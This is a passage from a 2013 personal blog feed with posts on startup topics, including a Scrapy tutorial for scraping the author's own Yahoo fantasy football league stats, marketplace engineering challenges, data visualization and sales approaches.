<p>I worry that it’s going to get increasingly more difficult to build a software startup in the future as large companies develop data monopolies. Imagine trying to write language translation software without having access to Google’s data? Or trying to do audio transcription by relying on publicly available data? It’s going to be impossible to compete by relying on publicly available data source while large companies build out their internal data monopolies - especially by using their existing products to <a href="http://www.infoworld.com/t/data-management/google-wants-your-phonemes-539" target="_blank">subsidize the cost</a> of collecting this data. Data also begets more data. By giving us great experiences, we’re willing to provide more and more information that is then used to launch new products which have us surrendering more and more data.</p>

<p>No matter how good an algorithm is it still needs data to be useful and I hope we’re not shooting ourselves in the foot by volunteering our data so easily. I’d love to see companies that collect user-contributed information be required to have it shared with their users so that they can have it used by other services. It’s not going to solve everything but it’s a step in the right direction.</p>

<p>Successful startups have always had to overcome challenges so the data monopoly problem will just be more of the same and should hopefully lead to some new approaches. An example that comes to mind is how <a href="http://www.duolingo.com/" target="_blank">Duolingo</a> is able to generate revenue by selling document translations that are transformed into language lessons that are then done freely by the community. I’m excited to see new business models that are able to innovate past this data gap.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Scraping Yahoo fantasy football stats with Scrapy</title>
   <link href="http://dangoldin.com/2013/07/17/scraping-yahoo-fantasy-football-stats-with-scrapy/"/>
   <updated>2013-07-17T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/07/17/scraping-yahoo-fantasy-football-stats-with-scrapy</id>
   <content:encoded><![CDATA[
<p>Last week, someone reminded me of an old project I had on GitHub that scraped fantasy football stats from Yahoo. Unfortunately, it was antiquated and failed to retrieve the data for the current season. I’ve also been interested in trying out the <a href="http://scrapy.org/" target="_blank">Scrapy</a> framework and decided this would be a good opportunity to give it a shot. I tried finding a sample project that dealt with authentication as a starting point but wasn’t able to find one so hopefully my attempt can serve as an example to others.</p>

<p>The full project is <a href="https://github.com/dangoldin/yahoo-ffl" target="_blank">available on GitHub</a> but I wanted to highlight a few of the components:</p>

<ul class="bulleted">
	<li><strong>parse method</strong>: This submits a form POST to the Yahoo login page which authenticates the session. The key point here is to specify a callback function which will continue the existing session.

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">parse</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">response</span><span class="p">):</span>
    <span class="k">return</span> <span class="p">[</span><span class="n">FormRequest</span><span class="p">.</span><span class="n">from_response</span><span class="p">(</span><span class="n">response</span><span class="p">,</span>
                <span class="n">formdata</span><span class="o">=</span><span class="p">{</span><span class="s">'login'</span><span class="p">:</span> <span class="bp">self</span><span class="p">.</span><span class="n">settings</span><span class="p">[</span><span class="s">'YAHOO_USERNAME'</span><span class="p">],</span>
                		  <span class="s">'passwd'</span><span class="p">:</span> <span class="bp">self</span><span class="p">.</span><span class="n">settings</span><span class="p">[</span><span class="s">'YAHOO_PASSWORD'</span><span class="p">]},</span>
                <span class="n">callback</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">after_login</span><span class="p">)]</span></code></pre></figure>

	</li>
	<li><strong>parse_stats method</strong>: In previous projects, I struggled with separating the crawling from the parsing since the page would have information that would relevant to both - for example I would want to extract information from a page as well as find the next page to scrape. Scrapy offers a nice solution by letting you return different types from the same method. Returing a Request will lead to another page being crawled but one can also returned the scraped structured data via an Item. In the case of the scraper, I return the fantasy football stats on each page via Items but also return a Request when I want to navigate to the next page of stats.

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">parse_stats</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">response</span><span class="p">):</span>
    <span class="n">hxs</span> <span class="o">=</span> <span class="n">HtmlXPathSelector</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>

    <span class="c1"># Parse the next url
</span>    <span class="n">next_page</span> <span class="o">=</span> <span class="n">hxs</span><span class="p">.</span><span class="n">select</span><span class="p">(</span><span class="s">'//ul[@class="pagingnavlist"]/li[contains(@class,"last")]/a/@href'</span><span class="p">)</span>
    <span class="n">next_page_url</span> <span class="o">=</span> <span class="s">'http://football.fantasysports.yahoo.com'</span> <span class="o">+</span> <span class="n">next_page</span><span class="p">.</span><span class="n">extract</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">count</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">RE_CNT</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="n">next_page_url</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span> <span class="c1"># Don't go past a certain threshold of players
</span>    <span class="n">current_week</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">RE_WEEK</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="n">next_page_url</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>

    <span class="bp">self</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">'Next url is at count {} with week {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">count</span><span class="p">,</span> <span class="n">current_week</span><span class="p">))</span>

    <span class="k">if</span> <span class="n">current_week</span> <span class="o">&lt;=</span> <span class="mi">17</span><span class="p">:</span>
        <span class="c1"># Parse the stats
</span>        <span class="n">stat_rows</span> <span class="o">=</span> <span class="n">hxs</span><span class="p">.</span><span class="n">select</span><span class="p">(</span><span class="s">'//table[@id="statTable0"]/tbody/tr'</span><span class="p">)</span>
        <span class="n">xpath_map</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s">'name'</span><span class="p">:</span> <span class="s">'td[contains(@class,"player")]/div[contains(@class,"ysf-player-name")]/a/text()'</span><span class="p">,</span>
            <span class="s">'position'</span><span class="p">:</span> <span class="s">'td[contains(@class,"player")]/div[contains(@class,"ysf-player-detail")]/ul/li[contains(@class,"ysf-player-team-pos")]/span/text()'</span><span class="p">,</span>
            <span class="s">'opp'</span><span class="p">:</span> <span class="s">'td[contains(@class,"opp")]/text()'</span><span class="p">,</span>
            <span class="s">'passing_yds'</span><span class="p">:</span> <span class="s">'td[@class="stat"][1]/text()'</span><span class="p">,</span>
            <span class="s">'passing_tds'</span><span class="p">:</span> <span class="s">'td[@class="stat"][2]/text()'</span><span class="p">,</span>
            <span class="s">'passing_int'</span><span class="p">:</span> <span class="s">'td[@class="stat"][3]/text()'</span><span class="p">,</span>
            <span class="s">'rushing_yds'</span><span class="p">:</span> <span class="s">'td[@class="stat"][4]/text()'</span><span class="p">,</span>
            <span class="s">'rushing_tds'</span><span class="p">:</span> <span class="s">'td[@class="stat"][5]/text()'</span><span class="p">,</span>
            <span class="s">'receiving_recs'</span><span class="p">:</span> <span class="s">'td[@class="stat"][6]/text()'</span><span class="p">,</span>
            <span class="s">'receiving_yds'</span><span class="p">:</span> <span class="s">'td[@class="stat"][7]/text()'</span><span class="p">,</span>
            <span class="s">'receiving_tds'</span><span class="p">:</span> <span class="s">'td[@class="stat"][8]/text()'</span><span class="p">,</span>
            <span class="s">'return_tds'</span><span class="p">:</span> <span class="s">'td[@class="stat"][9]/text()'</span><span class="p">,</span>
            <span class="s">'misc_twopt'</span><span class="p">:</span> <span class="s">'td[@class="stat"][10]/text()'</span><span class="p">,</span>
            <span class="s">'fumbles'</span><span class="p">:</span> <span class="s">'td[@class="stat"][11]/text()'</span><span class="p">,</span>
            <span class="s">'points'</span><span class="p">:</span> <span class="s">'td[contains(@class,"pts")]/text()'</span><span class="p">,</span>
        <span class="p">}</span>
        <span class="k">for</span> <span class="n">stat_row</span> <span class="ow">in</span> <span class="n">stat_rows</span><span class="p">:</span>
            <span class="n">stats_item</span> <span class="o">=</span> <span class="n">ScrapefflPlayerItem</span><span class="p">()</span>
            <span class="n">stats_item</span><span class="p">[</span><span class="s">'week'</span><span class="p">]</span> <span class="o">=</span> <span class="n">current_week</span>
            <span class="k">for</span> <span class="n">col_name</span><span class="p">,</span> <span class="n">xpath</span> <span class="ow">in</span> <span class="n">xpath_map</span><span class="p">.</span><span class="n">items</span><span class="p">():</span>
                <span class="n">stats_item</span><span class="p">[</span><span class="n">col_name</span><span class="p">]</span> <span class="o">=</span> <span class="n">stat_row</span><span class="p">.</span><span class="n">select</span><span class="p">(</span><span class="n">xpath</span><span class="p">).</span><span class="n">extract</span><span class="p">()</span>
            <span class="k">yield</span> <span class="n">stats_item</span>

    <span class="c1"># Jump to next week if we go past the threshold of players
</span>        <span class="k">if</span> <span class="n">count</span> <span class="o">&gt;</span> <span class="bp">self</span><span class="p">.</span><span class="n">settings</span><span class="p">[</span><span class="s">'MAX_STATS_PER_WEEK'</span><span class="p">]:</span>
            <span class="k">yield</span> <span class="n">Request</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">base_url</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">settings</span><span class="p">[</span><span class="s">'YAHOO_LEAGUEID'</span><span class="p">],</span> <span class="n">current_week</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="n">callback</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">parse_stats</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">yield</span> <span class="n">Request</span><span class="p">(</span><span class="n">next_page_url</span><span class="p">,</span> <span class="n">callback</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">parse_stats</span><span class="p">)</span></code></pre></figure>
}
	</li>
	<li><strong>XPath expressions</strong>: In the past, I'd use either BeautifulSoup or PyQuery to traverse the DOM but found XPath expressions to be simpler. There’s less code to write and the expressions are easier to understand and have a higher information density.

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">stat_rows</span> <span class="o">=</span> <span class="n">hxs</span><span class="p">.</span><span class="n">select</span><span class="p">(</span><span class="s">'//table[@id="statTable0"]/tbody/tr'</span><span class="p">)</span>
<span class="n">xpath_map</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">'name'</span><span class="p">:</span> <span class="s">'td[contains(@class,"player")]/div[contains(@class,"ysf-player-name")]/a/text()'</span><span class="p">,</span>
    <span class="s">'position'</span><span class="p">:</span> <span class="s">'td[contains(@class,"player")]/div[contains(@class,"ysf-player-detail")]/ul/li[contains(@class,"ysf-player-team-pos")]/span/text()'</span><span class="p">,</span>
    <span class="s">'opp'</span><span class="p">:</span> <span class="s">'td[contains(@class,"opp")]/text()'</span><span class="p">,</span>
    <span class="s">'passing_yds'</span><span class="p">:</span> <span class="s">'td[@class="stat"][1]/text()'</span><span class="p">,</span>
    <span class="s">'passing_tds'</span><span class="p">:</span> <span class="s">'td[@class="stat"][2]/text()'</span><span class="p">,</span>
    <span class="s">'passing_int'</span><span class="p">:</span> <span class="s">'td[@class="stat"][3]/text()'</span><span class="p">,</span>
    <span class="s">'rushing_yds'</span><span class="p">:</span> <span class="s">'td[@class="stat"][4]/text()'</span><span class="p">,</span>
    <span class="s">'rushing_tds'</span><span class="p">:</span> <span class="s">'td[@class="stat"][5]/text()'</span><span class="p">,</span>
    <span class="s">'receiving_recs'</span><span class="p">:</span> <span class="s">'td[@class="stat"][6]/text()'</span><span class="p">,</span>
    <span class="s">'receiving_yds'</span><span class="p">:</span> <span class="s">'td[@class="stat"][7]/text()'</span><span class="p">,</span>
    <span class="s">'receiving_tds'</span><span class="p">:</span> <span class="s">'td[@class="stat"][8]/text()'</span><span class="p">,</span>
    <span class="s">'return_tds'</span><span class="p">:</span> <span class="s">'td[@class="stat"][9]/text()'</span><span class="p">,</span>
    <span class="s">'misc_twopt'</span><span class="p">:</span> <span class="s">'td[@class="stat"][10]/text()'</span><span class="p">,</span>
    <span class="s">'fumbles'</span><span class="p">:</span> <span class="s">'td[@class="stat"][11]/text()'</span><span class="p">,</span>
    <span class="s">'points'</span><span class="p">:</span> <span class="s">'td[contains(@class,"pts")]/text()'</span><span class="p">,</span>
<span class="p">}</span></code></pre></figure>

	</li>
</ul>

<p>This also got me thinking about the evolution of my approach to scraping. In 2006, I was into Perl and scraped using the LWP::Simple, WWW::Mechanize and the HTML::TreeBuilder libraries. After I moved on to Python I switched to using urllib and BeautifulSoup. Most recently, I’ve started using the wonderful requests library along with PyQuery. Conceptually, these approaches are the same: first retrieve a web page and then extract the data you want by traversing the DOM. Scrapy does the same thing internally but by removing a ton of the boilerplate, it lets you focus on the key problems in scraping - figuring out what page to scrape next and figuring out how to extract the content. The rest is handled by Scrapy itself - including file storage, retries, throttling, and probably a ton more that I haven’t gotten a chance to explore yet.</p>

<p>This also gives me some time to work on the actual draft algorithm. My goal is to create a strategy that’s using a value based approach combined with my schedule. The idea is that I shouldn’t pick the players that will have the highest point total over the season but the ones that will have more points during my tough matchups. Of course, it’s almost all luck but I’m still looking forward to attempting this approach.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Marketplaces are hard</title>
   <link href="http://dangoldin.com/2013/07/13/marketplaces-are-hard/"/>
   <updated>2013-07-13T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/07/13/marketplaces-are-hard</id>
   <content:encoded><![CDATA[
<p>There are countless posts discussing the business and marketing challenges when building a marketplace but I wanted to discuss the issues on the tech side. While we ran into technical challenges building <a href="http://getpressi.com/" target="_blank">Pressi</a> they were mostly issues with scaling and dealing with the various social network APIs. With <a href="https://makersalley.com/" target="_blank">Makers Alley</a>, we didn’t run into scaling or API issues but had to deal with a ton of functionality in order to be seen as a credible marketplace. Individually, the features are simple for an intermediate developer to build but there are a lot of them with varying degrees of nuance and logic that need to be worked out.</p>

<p>Note that some of these issues are only applicable to “maker” marketplaces where the merchants make the pieces to order. In those cases, I refer to them as makers rather than merchants.</p>

<p>In no particular order:</p>

<ul class="bulleted">
	<li><strong>Payments</strong>: <a href="http://stripe.com/" target="_blank">Stripe</a> and <a href="https://www.balancedpayments.com/" target="_blank">Balanced</a> have made this significantly simpler but one thing to watch out for is that you will need to have a merchant signup process to collect the required regulatory information if you want to automate disbursements.</li>
	<li><strong>Shipping and Tracking</strong>: Makers take a different amount of time to make each piece. Buyers should know this information before placing an order and makers need to be able to change it depending on their schedule and order load. Merchants need the ability to mark an order as shipped and possibly provide a tracking number to the buyer. You should notify buyers when their order has shipped.</li>
	<li><strong>Logistics</strong>: While you're not holding inventory, you're charging customers and expect the merchants to fulfill their end of the agreement. How do you deal with a merchant sending an order late or not being able to fulfill an order? Do you want to have merchants approve every order they receive or do you assume that they'll be able to fulfill it? How about a single order containing items from many merchants?</li>
	<li><strong>Returns</strong>: No matter how good the products are there will always be someone who's unhappy with an item and you need to have a return/refund policy. For small items it's simple to figure out the logistics but how do you deal with someone wanting to return a dining table to a merchant a few states away? Where should the item be sent and who's responsible for paying the shipping and handling cost? What happens to the returned item?</li>
	<li><strong>Messaging</strong>: We discovered this a bit late but customers really want a way to talk to the merchant. Some buyers will want to customize an order and may want to both send exchange photos with the merchant to make sure they're getting what they want.</li>
	<li><strong>Shopping Carts</strong>: There are a bunch of existing solutions out there but we weren't able to find one that fit the needs of a two sided marketplace that supported customizable product options. there are a lot of things we take for granted when using a full fledged site like Amazon - making changes to your shopping cart, buying from multiple merchants, applying rebates and discounts, and getting recommendations. A possible edge case is merchants running out of inventory while someone is going through the checkout process.</li>
	<li><strong>Orders</strong>: Both merchants and buyers need to see a history of their orders. The implication is that once an order is placed it needs to be immutable and timestamped so that changes to the items are only reflected going forward. In addition, orders can get messy since a single order may be spread out across multiple merchants and items. What happens if one merchant can fulfill their half of the order while the one can't? Do you issue a refund for part of the order? What if the customer only wanted the items as a package deal?</li>
	<li><strong>Taxes</strong>: At some point you need to start dealing with taxes with each state having their own regulations and rates. We haven't implemented the details here yet but I suspect interstate commerce can get complicated quickly.</li>
	<li><strong>Reviews</strong>: Before a purchase, buyers want to see reviews of an item. After a purchase, buyers may want to rate and review the items. Should merchants have the ability to respond or challenge a review?</li>
	<li><strong>Search</strong>: This is a big one. Buyers need to be able to quickly find what they're looking for or they'll give up and go somewhere else. What criteria can users search for? Are you going to deal with typos and misspellings? Should you support faceting? How should you tier your prices? Do you need to support geospatial search? This is probably the biggest piece that requires understanding your audience and tailoring the search experience to them.</li>
	<li><strong>Images</strong>: It's rare that someone will buy a physical item without at least seeing a picture of it first. Makers need a simple way to upload multiple images and change the order in which they are displayed. The code should also be smart about generating thumbnails that can be used on different pages - search/listing, product view, shopping cart, etc.</li>
	<li><strong>Changing Inventory</strong>: Makers will need to be able to modify and remove what they're selling. At the same time, you need to have a record of the history so that buyers and makers can look at prior sales.</li>
</ul>

<p>Most of these issues can (and should) be handled manually at the beginning either through the backend or through email but this approach won’t scale. The goal is to be able to support the various use cases even if they have to be done manually. This will make you look credible to your customers and also give you a sense of which cases are the costliest and need to be automated. Technology shouldn’t be the primary focus for a marketplace business and you will most likely fail due to a lack of users on one of the sides. At the same time, the technology behind a marketplace isn’t simple since you’re basically smashing together an ecommerce site with a social network. If you have any additional thoughts or questions definitely let me know and I’ll try to help.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>D3 and Vega</title>
   <link href="http://dangoldin.com/2013/07/09/d3-and-vega/"/>
   <updated>2013-07-09T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/07/09/d3-and-vega</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/mcsp-star.png" alt="A data visualization I'm working on" width="780" height="780" layout="responsive"/>

<p>Something I’ve always enjoyed is messing around with data. For me, the first part has always been to plot the data to get a quick understanding of the dataset. Is there any obvious distribution visible? What are the data ranges? Are there any clusters that fit a known pattern? Does the data look clean or are there a ton of outliers? Does the data even make sense? Only then would I start the analysis and modeling piece.</p>

<p>At first, I’d just dump the data into Excel to generate various charts but moved on to using Perl and Python to generate charts when I learned the value of reusable code. While at <a href="http://www.yodle.com/" target="_blank">Yodle</a>, I picked up R which gave me more power than what I knew to do with and introduced me to a whole new set of visualizations and models. Recently, I’ve been having a blast using <a href="http://d3js.org/" target="_blank">D3</a> and <a href="http://trifacta.github.io/vega/" target="_blank">Vega</a>. The biggest appeal is that they’re in Javascript so they can run in all modern browsers and make it very easy to support interactive behavior. The best analyses always tell a story and allowing users to interact with the data is a great way for them to craft their own story. I’m hopeful that such tools will improve data accessibility and get people excited about gleaning their own insights.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Meetings: to take or not to take?</title>
   <link href="http://dangoldin.com/2013/07/07/meetings-to-take-or-not-to-take/"/>
   <updated>2013-07-07T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/07/07/meetings-to-take-or-not-to-take</id>
   <content:encoded><![CDATA[
<p>I struggle with this one. Some days I feel as if I should take every meeting since it’s impossible to know where it can lead. One meeting can completely change a business, generate some consulting work, or lead to new friendships. At the same time, taking every meeting would eat up a chunk of time and most meetings end up fading from memory.</p>

<p>I’m still figuring out my approach but do believe that having fewer, more meaningful relationships is more valuable than having many fleeting ones. Unfortunately, it’s not clear what will end up being meaningful before the meeting. Currently, I try to take every first meeting or at least have a phone call but have been scheduling them all on a single day, early in the morning, or late in the evening to avoid disruption. I’m also trying to make every meeting valuable by taking follow up notes in order to reach out later if I come across anything relevant or if I need to send an introduction. Probably the most important thing I’ve learned is that it’s easier to rejuvenate an older relationship than to create a brand new one so I’ve been making an effort to catch up with at least two former acquaintances each month.</p>

<p>There’s no single approach to meetings that will work for everyone but relationships are important regardless of what you do and it’s essential to maintain and grow them. I’d love to hear how others deal with meeting overload.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>A design that's too good?</title>
   <link href="http://dangoldin.com/2013/07/03/a-design-thats-too-good/"/>
   <updated>2013-07-03T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/07/03/a-design-thats-too-good</id>
   <content:encoded><![CDATA[
<p>This is a bit of a first-world problem but it’s possible for a design to be too good. A great design may lead to an increase in your vanity metrics but that won’t necessarily translate into a successful business. In fact, it’s likely that these low-value users will increase your costs.</p>

<p>When we redesigned the landing page for Pressi (formerly Glossi) we saw the signup rate from our landing page shoot up to to close to 34% from below 5%. Unfortunately, our retention rates were abysmal and we were stuck supporting thousands of Pressi pages that were not seeing any engagement. This led to a massive increase in our AWS costs that we had to scramble to contain. The solution was to be smarter about the frequency of our data pulling as well as minimizing the amount of data we were storing for our users. In hindsight, we should have solved our retention problem before trying to grow our users but we were too obsessed with our user growth numbers to do the right thing.</p>

<p>I realize that user growth is a problem that many startups would love to have and that it’s foolish to choose a crappy design over a great one. At the same time, if you’re not tracking the metrics that align with what you’re trying to accomplish, a surge in growth will be more damaging than beneficial. The corollary to this is that if your design sucks and yet you’re still getting signups then you must be onto something.</p>

<p>For those interested, here’s the signup flow that had the ~34% signup rate. The awesome design work was done by <a href="http://marcschaffnergurney.com/" target="_blank">Marc</a>.</p>

<ul class="thumbnails">
  <li class="span7">
    <div class="thumbnail">
        <img src="http://dangoldin.com/assets/static/images/glossi-landing-page.jpg" alt="Pressi landing page" width="1440" height="960" layout="responsive"/>
        <p>The Pressi landing page</p>
    </div>
  </li>

  <li class="span7">
    <div class="thumbnail">
        <img src="http://dangoldin.com/assets/static/images/glossi-onboarding-step-2.jpg" alt="Pressi signup step 2" width="1440" height="900" layout="responsive"/>
        <p>Pressi signup step two</p>
    </div>
  </li>

  <li class="span7">
    <div class="thumbnail">
        <img src="http://dangoldin.com/assets/static/images/glossi-onboarding-step-2.jpg" alt="Pressi signup step 3" width="1440" height="900" layout="responsive"/>
        <p>Pressi signup step three</p>
    </div>
  </li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Externalizing externalities in brick and mortar</title>
   <link href="http://dangoldin.com/2013/07/01/externalizing-externalities-in-brick-and-mortar/"/>
   <updated>2013-07-01T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/07/01/externalizing-externalities-in-brick-and-mortar</id>
   <content:encoded><![CDATA[
<div class="right10">
  <img src="http://dangoldin.com/assets/static/images/biergarten-ipad.jpg" alt="The iPad at the Laguardia Biergarten" width="600" height="800" layout="responsive"/>
</div>

<p>Last week, I had a morning flight out of Laguardia Airport and being into all things tech decided to grab a coffee at a place called Biergarten since they had iPads at every seat. Turned out that the only way to order and pay was by using the provided iPad with the attached credit card reader. I had 30 minutes to kill before my flight and decided to spend it observing the interactions others had with this ordering system.</p>

<p>During the 30 minutes, I saw 6 people approach the bartender and every single one tried to order directly from the bartender without paying any attention to the iPads. Surprisingly, none of them gave up after being told they had to order using the iPad although two couldn’t figure out how to use the iPad and needed help. The major points of frustration were finding the app and then realizing that you needed to “check out” before submitting the order.</p>

<p>I suspect no one actually benefits from this sort of setup. The supposed benefits to Biergarten are that they’re able to hire fewer people and collect payments upfront but I’m not sure it’s worth it given the high usability cost to the consumer. The staff is now kept busy explaining how to operate the iPads and customers are significantly slower at ordering than a trained waitstaff would be. In addition, if an iPad is the only way to order then they can’t have more customers than there are iPads - no one can get anything to go or have a drink standing up unless there are iPads available. The only way this is a good idea is if the iPads are able to attract more customers.</p>

<p>Essentially, the company is trying to externalize the cost of serving customers to the customers without taking into account their experience and frustration. You want to make it as easy as possible for people to give you their money and forcing technology down your customers’ throats isn’t always the answer. As optimistic as I am about technology making things easier, it’s going to be difficult for brick and mortar places to move to a self serve model. It’s simply easier to give someone cash or a credit card and have them do the work than doing it yourself.</p>

<img src="http://dangoldin.com/assets/static/images/biergarten.jpg" alt="The scene at the Laguardia Biergarten" width="600" height="800" layout="responsive"/>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Business frameworks are actually useful</title>
   <link href="http://dangoldin.com/2013/06/25/business-frameworks-are-actually-useful/"/>
   <updated>2013-06-25T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/06/25/business-frameworks-are-actually-useful</id>
   <content:encoded><![CDATA[
<p>Tom Tunguz wrote a <a href="http://tomtunguz.com/diagrams" target="_blank">great post</a> yesterday sharing the frameworks he uses to evaluate and analyze startups. For this post, I’m not interested in the content (which is great for anyone building a company) but I am interested in the concept of business frameworks and their application. When I was younger and came across a “business” framework I would dismiss it as obvious and move on. Now, I’m aware of how valuable a good framework can be. A good framework imposes structure that leads to a clearer though process with better results. At the same time, it needs to be simple to apply but be expressive enough to describe the complexity of a business. Being human, we also don’t want to think about our own fallibility and weaknesses which makes it difficult to critique our businesses. We also want to solve problems on our own rather than share our uncertainties with others. A framework serves as an impartial third party where you go through and fill in the blanks until you discover you aren’t in as good of a shape as you thought. Now you can work on growing your company instead of avoiding self-criticism.</p>

<p>I recall struggling to fill out the Lean Canvas for Pressi after reading one of the lean startup books. It took me a few hours with multiple breaks and online searches but I ended up with a much better understanding of our business. It became easier to see where the risks were and gave us tons of ideas around acquiring new users and generating revenue. None of these ideas were groundbreaking and I’m sure we would have gotten to them eventually but it was valuable getting to them earlier since we were able to take them into account when building the product.</p>

<p>I’m not sure why investors don’t require pitching startups to share these instead of a pitch deck, they seem much more useful.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Where are you on the sales matrix?</title>
   <link href="http://dangoldin.com/2013/06/21/where-are-you-on-the-sales-matrix/"/>
   <updated>2013-06-21T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/06/21/where-are-you-on-the-sales-matrix</id>
   <content:encoded><![CDATA[
<p>Something I’ve been thinking about is the variety of sales approaches. On one extreme, you have pharmaceutical companies sending sales reps to visit doctors offices to try to get them to prescribe their drugs. On the other you have companies such as MixPanel and Dropbox which rely on a self serve approach. And in between you have companies such as NewRelic which offer a self-serve trial and try to upsell you with emails from a sales rep.</p>

<p>Depending on a product’s complexity and its cost structure your sales approach may be limited but it’s always worth seeing the other approaches available and if any of them may fit. It’s likely that an approach that didn’t work a year ago may work right now. A simple way to check is to look at newly launched competitors in your space and see how they’re acquiring customers.</p>

<p>After trying to come up with an exhaustive list of approaches I figured out it’s easier to just rank them across two dimensions:</p>

<ul class="bulleted">
    <li><strong>Proximity</strong>: This is both physical proximity as well as familiarity with your customer. It’s much easier to sell when you’re in the same room as them and know their story than when you’re sending out a generic email.</li>
    <li><strong>Inbound vs outbound</strong>: A customer already having an interest in your product is much better than trying to interest him from scratch.</li>
</ul>

<p>Here’s my attempt at coming up with matrix showing where different companies would lie based on their sales approach.</p>

<img src="http://dangoldin.com/assets/static/images/sales-matrix.png" alt="The Sales Matrix" width="986" height="850" layout="responsive"/>

<p>It’s possible to be profitable by being in any spot; a higher acquisition cost will just lead to a higher price. That’s why an Oracle installation can <a href="http://www.oracle.com/us/corporate/pricing/price-lists/index.html" target="_blank">cost millions</a> of dollars a year and why the enterprise Dropbox product is around <a href="https://www.dropbox.com/business/pricing" target="_blank">$125/user/year</a>. I believe that current trends favor businesses in the inbound/self-serve quadrant. This is due to people becoming more comfortable with technology as software gets better and easier to use and the ability for companies to offer free-trials with near-zero marginal cost. A corollary is that there’s an opportunity to compete with businesses outside the quadrant by creating simpler, cheaper versions of their product. The first version will suck compared to the existing products but as long as it’s cheaper and still solves a problem you should be able to get some customers and revenue (a la <a href="http://en.wikipedia.org/wiki/Lean_Startup" target="_blank">Lean Startup</a>). Over time, you can continue to grow and keep on building our product until you’re competing with the existing companies (a la <a href="http://en.wikipedia.org/wiki/The_Innovator's_Dilemma" target="_blank">Innovator’s Dilemma</a>).</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Pushing moral boundaries</title>
   <link href="http://dangoldin.com/2013/06/20/pushing-moral-boundaries/"/>
   <updated>2013-06-20T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/06/20/pushing-moral-boundaries</id>
   <content:encoded><![CDATA[
<p>Startups need to use everything in their arsenal to grow. A big part of it is playing in the grey area between moral and immoral. Do you create fake users and comments to portray an active community? Do you reply to posts on Craigslist trying to get visitors to your site? It’s also much easier to play in this area when you’re a startup - you’re most likely too small to be noticed and even if you are the press won’t spend much time on it. Google already gets a ton of flak every time someone complains about losing business due to a search engine update, imagine what would happen if a Google employee was caught spamming Craigslist.</p>

<p>It’s important for all companies, and especially startups, to test these moral boundaries but there’s no clear answer of what the boundaries actually are, just shades of gray which will vary from company to company and from team to team. I believe that until you get some resistance you need to keep on pushing otherwise you never know that you’re doing enough.</p>

<p>At <a href="https://makersalley.com/" target="_blank">Makers Alley</a>, our lesson came when we wanted to increase the amount of makers signing up. We decided to create pages for all makers in an area and then email each of them a link to “claim” their page. In order to make the pages look appealing we took images and descriptions from their individual sites. The results were mixed: as expected most emails didn’t even get a response but the ones that did had a wide range of reactions. Some of the makers gladly claimed their page and loved that their content was automatically pulled. Yet others were pissed that we used their copyright images on our own site without their permission. We weren’t comfortable knowingly upsetting some users and quickly removed the images from the unclaimed pages. We continued running a few other tests to try to maximize the “sign up rate per email” and ended up settling on a simple email that asks the makers to sign up and getting rid of the claim functionality. But without making the misstep in the beginning we wouldn’t have been able to settle on this approach. I do worry that less scrupulous companies have a higher chance of success but I can only take actions I’m comfortable with.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Regulation and the share economy</title>
   <link href="http://dangoldin.com/2013/06/16/regulation-and-the-share-economy/"/>
   <updated>2013-06-16T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/06/16/regulation-and-the-share-economy</id>
   <content:encoded><![CDATA[
<p>The past few years have seen the rise of the share economy with companies such as AirBnB, Sidecar, Lyft, and TaskRabbit seeing massive growth. Unfortunately, they’re getting significant opposition from government and the entrenched special interest groups. Most of the pushback is under the guise of consumer safety and that regulations exist to protect the consumer.</p>

<p>Regulation is necessary when there’s an information asymmetry between a service provider and a consumer. In such cases, regulations help bridge that information gap and make the consumer more comfortable making the transaction. But the internet has been chipping away at this gap by building communities where people can share reviews and experiences. Yelp, Angie’s List, and Google are the largest of these traditional review sites but reviews are starting to appear everywhere that money is changing hands. Ecommerce sites offer reviews and ratings of the products they’re selling. The share economy companies self-regulate by offering communities with well thought out rating systems. Without well functioning communities they wouldn’t survive.</p>
